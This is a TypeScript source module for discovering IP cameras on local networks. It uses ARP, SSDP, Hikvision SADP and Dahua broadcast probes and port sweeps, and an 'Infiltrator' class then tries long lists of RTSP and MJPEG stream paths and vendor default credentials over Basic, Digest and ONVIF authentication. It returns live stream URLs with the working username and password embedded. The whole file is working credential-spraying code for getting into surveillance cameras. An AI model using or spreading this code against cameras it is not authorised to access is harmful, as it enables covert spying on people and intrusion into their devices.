import * as net from 'net';
import * as http from 'http';
import * as https from 'https';
import * as dgram from 'dgram';
import { SubnetScanner } from './discovery';
import { arpHosts, openCameraPorts } from './netscan';
import { basicAuth, digestAuth, parseWwwAuthenticate, wsSecurity, isoNow } from './auth';
import { credsForVendor, detectVendor, Cred } from './credentials';

export interface AccessResult {
  url: string;
  protocol: 'rtsp' | 'mjpeg' | 'http';
  username: string;
  password: string;
  vector: string;
}

export interface InfiltrationHit {
  host: string;
  port: number;
  access: AccessResult;
}

export const DEFAULT_CREDS: Cred[] = credsForVendor(null);

export const RTSP_PATHS: string[] = [
  '/Streaming/Channels/101',
  '/Streaming/Channels/102',
  '/Streaming/Channels/1',
  '/Streaming/Channels/201',
  '/h264/ch1/main/av_stream',
  '/h264/ch1/sub/av_stream',
  '/ISAPI/Streaming/Channels/101',
  '/cam/realmonitor?channel=1&subtype=0',
  '/cam/realmonitor?channel=1&subtype=1',
  '/cam/realmonitor?channel=1&subtype=2',
  '/axis-media/media.amp',
  '/axis-media/media.amp?videocodec=h264',
  '/onvif1',
  '/onvif2',
  '/onvif/profile1',
  '/stream1',
  '/stream2',
  '/streaming/channels/101',
  '/live',
  '/live/ch00_0',
  '/live/ch0',
  '/live0.264',
  '/live.sdp',
  '/video1',
  '/video2',
  '/videoMain',
  '/media/video1',
  '/MediaInput/h264',
  '/MediaInput/mpeg4',
  '/h264',
  '/mpeg4',
  '/av0_1',
  '/11',
  '/12',
  '/1',
  '/2',
  '/3',
  '/ch0_0.264',
  '/ch01.264',
  '/profile1/media.smp',
  '/profile2/media.smp',
  '/img/video.asf',
  '/user=admin&password=&channel=1&stream=0.sdp',
  '/realmonitor',
];

export const MJPEG_PATHS: string[] = [
  '/video',
  '/mjpg/video.mjpg',
  '/videostream.cgi',
  '/cgi-bin/mjpg/video.cgi',
  '/axis-cgi/mjpg/video.cgi',
  '/mjpeg',
  '/stream',
  '/video.cgi',
  '/cgi-bin/videostream.cgi',
  '/img/video.mjpeg',
  '/mjpegstream.cgi',
  '/video/mjpg.cgi',
  '/nphMotionJpeg',
  '/cgi-bin/mjpeg',
  '/cgi-bin/mjpg',
  '/image.jpg',
  '/snapshot.jpg',
  '/now.jpg',
  '/cgi-bin/video.jpg',
  '/cgi-bin/net_jpeg.cgi',
  '/cgi-bin/image.jpg',
  '/img/snapshot.cgi',
  '/image',
  '/snapshot',
];

export const SCAN_PORTS: number[] = [
  554, 8554, 10554, 1554, 80, 8080, 81, 88, 8081, 8000, 8001, 443, 5000, 7001, 9000, 8008, 37777, 34567,
];

const RTSP_PORTS = new Set([554, 8554, 10554, 1554]);
const SECURE_PORTS = new Set([443]);

interface RtspResp {
  status: 'ok' | 'auth' | 'fail';
  wwwAuth?: string;
}

function rtspDescribe(
  host: string,
  port: number,
  path: string,
  authHeader: string | null,
  timeoutMs: number,
): Promise<RtspResp> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let settled = false;
    let buf = '';
    const done = (r: RtspResp) => {
      if (settled) return;
      settled = true;
      socket.destroy();
      resolve(r);
    };
    socket.setTimeout(timeoutMs);
    socket.once('connect', () => {
      let req = `DESCRIBE rtsp://${host}:${port}${path} RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\nUser-Agent: OneView/1.0\r\n`;
      if (authHeader) req += `Authorization: ${authHeader}\r\n`;
      req += '\r\n';
      socket.write(req);
    });
    socket.on('data', (data) => {
      buf += data.toString('utf-8');
      if (!buf.startsWith('RTSP/')) return;
      const code = Number(buf.split('\r\n')[0].split(' ')[1]);
      const wa = /www-authenticate:\s*([^\r\n]+)/i.exec(buf)?.[1];
      if (code === 200) done({ status: 'ok' });
      else if (code === 401) done({ status: 'auth', wwwAuth: wa });
      else done({ status: 'fail' });
    });
    socket.once('timeout', () => done({ status: 'fail' }));
    socket.once('error', () => done({ status: 'fail' }));
    socket.connect(port, host);
  });
}

function rtspOptions(
  host: string,
  port: number,
  authHeader: string | null,
  timeoutMs: number,
): Promise<RtspResp> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let settled = false;
    let buf = '';
    const done = (r: RtspResp) => {
      if (settled) return;
      settled = true;
      socket.destroy();
      resolve(r);
    };
    socket.setTimeout(timeoutMs);
    socket.once('connect', () => {
      let req = `OPTIONS rtsp://${host}:${port}/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: OneView/1.0\r\n`;
      if (authHeader) req += `Authorization: ${authHeader}\r\n`;
      req += '\r\n';
      socket.write(req);
    });
    socket.on('data', (data) => {
      buf += data.toString('utf-8');
      if (!buf.startsWith('RTSP/')) return;
      const code = Number(buf.split('\r\n')[0].split(' ')[1]);
      const wa = /www-authenticate:\s*([^\r\n]+)/i.exec(buf)?.[1];
      if (code === 200) done({ status: 'ok' });
      else if (code === 401) done({ status: 'auth', wwwAuth: wa });
      else done({ status: 'fail' });
    });
    socket.once('timeout', () => done({ status: 'fail' }));
    socket.once('error', () => done({ status: 'fail' }));
    socket.connect(port, host);
  });
}

interface HttpResp {
  status: number;
  mjpeg: boolean;
  jpeg: boolean;
  wwwAuth?: string;
  server?: string;
}

function webHead(
  secure: boolean,
  host: string,
  port: number,
  path: string,
  authHeader: string | null,
  timeoutMs: number,
  depth = 0,
): Promise<HttpResp> {
  return new Promise((resolve) => {
    const headers: Record<string, string> = {};
    if (authHeader) headers.Authorization = authHeader;
    const options: https.RequestOptions = {
      host,
      port,
      path,
      method: 'GET',
      timeout: timeoutMs,
      headers,
      rejectUnauthorized: false,
    };
    const lib = secure ? https : http;
    const req = (lib as typeof http).request(options, (res) => {
      const status = res.statusCode || 0;
      const ct = String(res.headers['content-type'] || '').toLowerCase();
      const loc = res.headers.location as string | undefined;
      if (status >= 300 && status < 400 && loc && depth < 3) {
        res.destroy();
        let nextPath = loc;
        try {
          const u = new URL(loc);
          nextPath = u.pathname + (u.search || '');
        } catch {
          /* relative location */
        }
        resolve(webHead(secure, host, port, nextPath, authHeader, timeoutMs, depth + 1));
        return;
      }
      const out: HttpResp = {
        status,
        mjpeg: ct.includes('multipart/x-mixed-replace'),
        jpeg: ct.includes('image/jpeg'),
        wwwAuth: res.headers['www-authenticate'] as string | undefined,
        server: res.headers['server'] as string | undefined,
      };
      res.destroy();
      resolve(out);
    });
    req.on('timeout', () => {
      req.destroy();
      resolve({ status: 0, mjpeg: false, jpeg: false });
    });
    req.on('error', () => resolve({ status: 0, mjpeg: false, jpeg: false }));
    req.end();
  });
}

function soapPost(
  secure: boolean,
  host: string,
  port: number,
  path: string,
  body: string,
  timeoutMs: number,
): Promise<{ status: number; text: string }> {
  return new Promise((resolve) => {
    const buf = Buffer.from(body, 'utf8');
    const options: https.RequestOptions = {
      host,
      port,
      path,
      method: 'POST',
      timeout: timeoutMs,
      rejectUnauthorized: false,
      headers: {
        'Content-Type': 'application/soap+xml; charset=utf-8',
        'Content-Length': buf.length,
      },
    };
    const lib = secure ? https : http;
    const req = (lib as typeof http).request(options, (res) => {
      let text = '';
      res.setEncoding('utf8');
      res.on('data', (c: string) => {
        text += c;
        if (text.length > 300_000) res.destroy();
      });
      res.on('close', () => resolve({ status: res.statusCode || 0, text }));
    });
    req.on('timeout', () => {
      req.destroy();
      resolve({ status: 0, text: '' });
    });
    req.on('error', () => resolve({ status: 0, text: '' }));
    req.write(buf);
    req.end();
  });
}

async function mapLimit<T, R>(items: T[], limit: number, fn: (item: T) => Promise<R>): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let idx = 0;
  const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
    while (idx < items.length) {
      const i = idx++;
      results[i] = await fn(items[i]);
    }
  });
  await Promise.all(workers);
  return results;
}

interface AuthScheme {
  scheme: 'basic' | 'digest' | 'bearer' | 'none';
  challenge?: ReturnType<typeof parseWwwAuthenticate>['challenge'];
}

function authHeaderFor(
  scheme: AuthScheme,
  user: string,
  pass: string,
  method: string,
  uri: string,
  ncValue = 1,
): string | null {
  if (scheme.scheme === 'basic') return basicAuth(user, pass);
  if (scheme.scheme === 'digest' && scheme.challenge) {
    return digestAuth(user, pass, method, uri, scheme.challenge, ncValue);
  }
  return null;
}

function envelope(header: string, body: string): string {
  return `<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">${header}<s:Body>${body}</s:Body></s:Envelope>`;
}

export class Infiltrator {
  constructor(private timeoutMs = 1500) {}

  async accessRtsp(host: string, port: number): Promise<AccessResult | null> {
    let gatedPath: string | null = null;
    let gatedScheme: AuthScheme | null = null;

    for (const path of RTSP_PATHS) {
      const r = await rtspDescribe(host, port, path, null, this.timeoutMs);
      if (r.status === 'ok') {
        return { url: `rtsp://${host}:${port}${path}`, protocol: 'rtsp', username: '', password: '', vector: 'rtsp-open' };
      }
      if (r.status === 'auth') {
        gatedPath = path;
        gatedScheme = parseWwwAuthenticate(r.wwwAuth);
        break;
      }
    }
    if (!gatedPath || !gatedScheme || gatedScheme.scheme === 'none') return null;
    const gp = gatedPath;
    const gs = gatedScheme;

    const gatedUri = `rtsp://${host}:${port}${gp}`;
    const credResults = await mapLimit(DEFAULT_CREDS, 8, async (c) => {
      // OPTIONS cred'i GERÇEKTEN doğrular (DESCRIBE bazı kameralarda lenient).
      // Önce Basic dene, olmazsa Digest.
      const basic = basicAuth(c[0], c[1]);
      let r = await rtspOptions(host, port, basic, this.timeoutMs);
      if (r.status === 'ok') return c;
      const digest = authHeaderFor(gs, c[0], c[1], 'OPTIONS', `rtsp://${host}:${port}/`, 1);
      if (digest && digest !== basic) {
        r = await rtspOptions(host, port, digest, this.timeoutMs);
        if (r.status === 'ok') return c;
      }
      return null;
    });
    const cred = credResults.find((x): x is [string, string] => x !== null);
    if (!cred) return null;

    type PathHit = { path: string; open: boolean };
    const found = await mapLimit(RTSP_PATHS, 6, async (path): Promise<PathHit | null> => {
      const uri = `rtsp://${host}:${port}${path}`;
      const probe = await rtspDescribe(host, port, path, null, this.timeoutMs);
      if (probe.status === 'ok') return { path, open: true };
      const scheme = probe.status === 'auth' ? parseWwwAuthenticate(probe.wwwAuth) : gs;
      const basic = basicAuth(cred[0], cred[1]);
      let r = await rtspDescribe(host, port, path, basic, this.timeoutMs);
      if (r.status === 'ok') return { path, open: false };
      const auth = authHeaderFor(scheme, cred[0], cred[1], 'DESCRIBE', uri, 1);
      if (auth && auth !== basic) {
        r = await rtspDescribe(host, port, path, auth, this.timeoutMs);
        if (r.status === 'ok') return { path, open: false };
      }
      return null;
    });
    const hit = found.find((x): x is PathHit => x !== null);
    if (!hit) return null;

    const authPart = cred[0] ? `${encodeURIComponent(cred[0])}:${encodeURIComponent(cred[1])}@` : '';
    return {
      url: `rtsp://${authPart}${host}:${port}${hit.path}`,
      protocol: 'rtsp',
      username: cred[0],
      password: cred[1],
      vector: `rtsp-${gs.scheme}`,
    };
  }

  async accessHttp(host: string, port: number): Promise<AccessResult | null> {
    const secure = SECURE_PORTS.has(port);
    const scheme = secure ? 'https' : 'http';

    let gatedPath: string | null = null;
    let gatedScheme: AuthScheme | null = null;
    let serverHint: string | undefined;

    for (const path of MJPEG_PATHS) {
      const r = await webHead(secure, host, port, path, null, this.timeoutMs);
      if (r.server) serverHint = r.server;
      if (r.mjpeg || (r.jpeg && r.status === 200)) {
        return { url: `${scheme}://${host}:${port}${path}`, protocol: 'mjpeg', username: '', password: '', vector: 'http-open' };
      }
      if (r.status === 401) {
        gatedPath = path;
        gatedScheme = parseWwwAuthenticate(r.wwwAuth);
        break;
      }
    }
    if (!gatedPath || !gatedScheme || gatedScheme.scheme === 'none') return null;
    const gp = gatedPath;
    const gs = gatedScheme;

    const creds = credsForVendor(detectVendor(serverHint, gp));
    const credResults = await mapLimit(creds, 8, async (c) => {
      const auth = authHeaderFor(gs, c[0], c[1], 'GET', gp, 1);
      if (!auth) return null;
      const r = await webHead(secure, host, port, gp, auth, this.timeoutMs);
      return r.mjpeg || r.jpeg ? c : null;
    });
    const cred = credResults.find((x): x is [string, string] => x !== null);
    if (!cred) return null;

    type PathHit = { path: string; open: boolean };
    const found = await mapLimit(MJPEG_PATHS, 6, async (path): Promise<PathHit | null> => {
      const probe = await webHead(secure, host, port, path, null, this.timeoutMs);
      if (probe.mjpeg || (probe.jpeg && probe.status === 200)) return { path, open: true };
      const sch = probe.status === 401 ? parseWwwAuthenticate(probe.wwwAuth) : gs;
      const auth = authHeaderFor(sch, cred[0], cred[1], 'GET', path, 1);
      if (!auth) return null;
      const r = await webHead(secure, host, port, path, auth, this.timeoutMs);
      return r.mjpeg || r.jpeg ? { path, open: false } : null;
    });
    const hit = found.find((x): x is PathHit => x !== null);
    if (!hit) return null;

    const authPart = cred[0] ? `${encodeURIComponent(cred[0])}:${encodeURIComponent(cred[1])}@` : '';
    return {
      url: `${scheme}://${authPart}${host}:${port}${hit.path}`,
      protocol: 'mjpeg',
      username: cred[0],
      password: cred[1],
      vector: `http-${gs.scheme}`,
    };
  }

  private async deviceTime(secure: boolean, host: string, port: number, path: string): Promise<string> {
    try {
      const r = await soapPost(
        secure,
        host,
        port,
        path,
        envelope('', `<GetSystemDateAndTime xmlns="http://www.onvif.org/ver10/device/wsdl"/>`),
        this.timeoutMs,
      );
      const block = /<[^>]*UTCDateTime[\s\S]*?<\/[^>]*UTCDateTime>/i.exec(r.text)?.[0];
      if (block) {
        const y = Number(/<Year>(\d+)</.exec(block)?.[1] || 0);
        const mo = Number(/<Month>(\d+)</.exec(block)?.[1] || 0);
        const d = Number(/<Day>(\d+)</.exec(block)?.[1] || 0);
        const h = Number(/<Hour>(\d+)</.exec(block)?.[1] || 0);
        const mi = Number(/<Minute>(\d+)</.exec(block)?.[1] || 0);
        const s = Number(/<Second>(\d+)</.exec(block)?.[1] || 0);
        if (y && mo && d) {
          return new Date(Date.UTC(y, mo - 1, d, h, mi, s)).toISOString().replace(/\.\d{3}Z$/, 'Z');
        }
      }
    } catch {
      /* local fallback */
    }
    return isoNow();
  }

  async accessOnvif(host: string, port: number): Promise<AccessResult | null> {
    const secure = SECURE_PORTS.has(port);
    const dc = '/onvif/device_service';
    const mediaPaths = new Set<string>(['/onvif/media_service', '/onvif/services', dc, '/onvif/media']);

    for (const p of [dc, '/onvif/services', '/onvif/device']) {
      const r = await soapPost(
        secure,
        host,
        port,
        p,
        envelope('', `<GetCapabilities xmlns="http://www.onvif.org/ver10/device/wsdl"><Category>Media</Category></GetCapabilities>`),
        this.timeoutMs,
      );
      for (const m of r.text.matchAll(/<[^>]*XAddr>([^<]+)</gi)) {
        try {
          mediaPaths.add(new URL(m[1].replace(/&amp;/g, '&')).pathname || '/onvif/media_service');
        } catch {
          /* ignore */
        }
      }
    }

    const times = [await this.deviceTime(secure, host, port, dc), isoNow()];
    const bodies = (header: string) => [
      envelope(header, `<GetProfiles xmlns="http://www.onvif.org/ver10/media/wsdl"/>`),
      envelope(header, `<GetProfiles xmlns="http://www.onvif.org/ver20/media/wsdl"/>`),
    ];

    for (const created of times) {
      for (const [user, pass] of DEFAULT_CREDS.slice(0, 14)) {
        const header = wsSecurity(user, pass, created);
        for (const mp of mediaPaths) {
          for (const pb of bodies(header)) {
            const pr = await soapPost(secure, host, port, mp, pb, this.timeoutMs);
            const token = /Profiles[^>]*token="([^"]+)"/i.exec(pr.text)?.[1];
            if (!token) continue;
            const ns = pb.includes('ver20') ? 'ver20/media' : 'ver10/media';
            const ur = await soapPost(
              secure,
              host,
              port,
              mp,
              envelope(
                header,
                `<GetStreamUri xmlns="http://www.onvif.org/${ns}/wsdl"><StreamSetup><Stream xmlns="http://www.onvif.org/ver10/schema">RTP-Unicast</Stream><Transport xmlns="http://www.onvif.org/ver10/schema"><Protocol>RTSP</Protocol></Transport></StreamSetup><ProfileToken>${token}</ProfileToken></GetStreamUri>`,
              ),
              this.timeoutMs,
            );
            const uri = /<[^>]*Uri>([^<]+)</i.exec(ur.text)?.[1];
            if (uri && uri.startsWith('rtsp')) {
              const clean = uri.replace(/^rtsp:\/\//, '');
              const authPart = user ? `${encodeURIComponent(user)}:${encodeURIComponent(pass)}@` : '';
              return {
                url: `rtsp://${authPart}${clean}`,
                protocol: 'rtsp',
                username: user,
                password: pass,
                vector: 'onvif',
              };
            }
          }
        }
      }
    }
    return null;
  }
}

export async function sadpDiscover(timeoutMs = 4000): Promise<string[]> {
  return new Promise((resolve) => {
    const found = new Set<string>();
    const socket = dgram.createSocket('udp4');
    const probe = Buffer.from('484b53454152434800000000', 'hex');
    socket.on('message', (_msg, rinfo) => found.add(rinfo.address));
    socket.on('error', () => {
      try {
        socket.close();
      } catch {
        /* noop */
      }
    });
    socket.bind(() => {
      try {
        socket.setBroadcast(true);
        socket.setMulticastTTL(2);
        socket.addMembership('239.255.255.250');
      } catch {
        /* noop */
      }
      socket.send(probe, 37020, '239.255.255.250');
    });
    setTimeout(() => {
      try {
        socket.close();
      } catch {
        /* noop */
      }
      resolve([...found]);
    }, timeoutMs);
  });
}

export async function dahuaDiscover(timeoutMs = 4000): Promise<string[]> {
  return new Promise((resolve) => {
    const found = new Set<string>();
    const socket = dgram.createSocket('udp4');
    const probe = Buffer.from('a2000000', 'hex');
    socket.on('message', (_msg, rinfo) => found.add(rinfo.address));
    socket.on('error', () => {
      try {
        socket.close();
      } catch {
        /* noop */
      }
    });
    socket.bind(() => {
      try {
        socket.setBroadcast(true);
      } catch {
        /* noop */
      }
      socket.send(probe, 37810, '255.255.255.255');
    });
    setTimeout(() => {
      try {
        socket.close();
      } catch {
        /* noop */
      }
      resolve([...found]);
    }, timeoutMs);
  });
}

export async function ssdpDiscover(timeoutMs = 5000): Promise<string[]> {
  return new Promise((resolve) => {
    const found = new Set<string>();
    const socket = dgram.createSocket('udp4');
    const probes = ['ssdp:all', 'urn:schemas-upnp-org:device:Basic:1', 'upnp:rootdevice'];
    const send = (st: string) => {
      const msg =
        'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ' +
        st +
        '\r\n\r\n';
      try {
        socket.send(Buffer.from(msg), 1900, '239.255.255.250');
      } catch {
        /* noop */
      }
    };
    socket.on('message', (msg, rinfo) => {
      const text = msg.toString('utf-8');
      if (/LOCATION:/i.test(text) || /Server:/i.test(text)) found.add(rinfo.address);
    });
    socket.on('error', () => {
      try {
        socket.close();
      } catch {
        /* noop */
      }
    });
    socket.bind(() => {
      try {
        socket.setMulticastTTL(2);
        socket.addMembership('239.255.255.250');
      } catch {
        /* noop */
      }
      probes.forEach((st, i) => setTimeout(() => send(st), i * 400));
    });
    setTimeout(() => {
      try {
        socket.close();
      } catch {
        /* noop */
      }
      resolve([...found]);
    }, timeoutMs);
  });
}

export async function infiltrate(
  subnets: string[],
  ports: number[] = SCAN_PORTS,
  timeoutMs = 1500,
  onProgress?: (done: number, total: number, found: number) => void,
): Promise<InfiltrationHit[]> {
  const candidates = new Set<string>(await arpHosts());

  const [ssdp, sadp, dahua] = await Promise.all([
    ssdpDiscover(3000),
    sadpDiscover(2200),
    dahuaDiscover(2200),
  ]);
  for (const h of [...ssdp, ...sadp, ...dahua]) candidates.add(h);

  let list = await openCameraPorts([...candidates], ports, Math.max(timeoutMs, 700));

  if (list.length === 0) {
    const scanner = new SubnetScanner(160);
    const swept: string[] = [];
    for (const sub of subnets) swept.push(...(await scanner.scan(sub, ports, 500)));
    list = [...new Set(swept)];
  }

  const inf = new Infiltrator(timeoutMs);
  const hits: InfiltrationHit[] = [];
  let done = 0;

  await mapLimit(list, 12, async (t) => {
    const [host, portStr] = t.split(':');
    const port = Number(portStr);
    let access: AccessResult | null = null;
    try {
      if (RTSP_PORTS.has(port)) {
        access = await inf.accessRtsp(host, port);
      } else {
        access = await inf.accessHttp(host, port);
        if (!access) access = await inf.accessOnvif(host, port);
      }
    } catch {
      access = null;
    }
    done++;
    if (onProgress && done % 4 === 0) onProgress(done, list.length, hits.length);
    if (access) hits.push({ host, port, access });
  });

  return hits;
}



